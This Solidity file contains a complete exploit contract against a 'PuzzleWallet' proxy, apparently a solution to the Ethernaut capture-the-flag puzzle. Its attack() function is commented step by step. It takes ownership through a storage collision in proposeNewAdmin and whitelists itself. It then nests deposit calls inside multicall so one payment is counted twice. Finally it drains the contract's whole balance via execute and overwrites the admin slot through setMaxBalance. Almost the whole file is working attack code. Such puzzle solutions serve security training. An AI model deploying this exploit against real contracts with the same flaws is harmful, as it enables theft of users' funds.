pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IPuzzleWallet{
    function proposeNewAdmin(address _newAdmin) external;
    
    function owner() external returns(address);
    function maxBalance() external returns(uint256);
    function whitelisted(address x) external returns(bool);
    function balances(address x) external returns(uint256);

    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) external payable;    
}

contract AttackPuzzleWallet{        
    IPuzzleWallet public pw;    
    
    receive() external payable {}

    constructor (address _victim) payable {
        pw = IPuzzleWallet(_victim);        
    }

    function attack() public {
        //sets owner
        pw.proposeNewAdmin(address(this)); 
        //as attacker is owner, it can add itself to whitelist
        pw.addToWhitelist(address(this));

        //we are only allowed to call deposit once in the multicall    
        bytes memory depositcall = abi.encodeWithSignature("deposit()");
        bytes[] memory wrapped_depositcall = new bytes[](1);
        wrapped_depositcall[0] = depositcall;

        //we wrap a deposit in another multicall
        //ie., multicall(deposit,multicall(deposit))
        bytes[] memory nestedCall = new bytes[](2);
        nestedCall[0] = depositcall;        
        nestedCall[1] = abi.encodeWithSignature("multicall(bytes[])", wrapped_depositcall);
        
        uint amtToDrain = address(pw).balance; 
        //take credit for existing balance of victim contract, as well as the balance we added
        pw.multicall{value:amtToDrain}(nestedCall);                
        pw.execute(msg.sender, 2*amtToDrain, ""); //drain the puzzlewallet contract
        pw.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
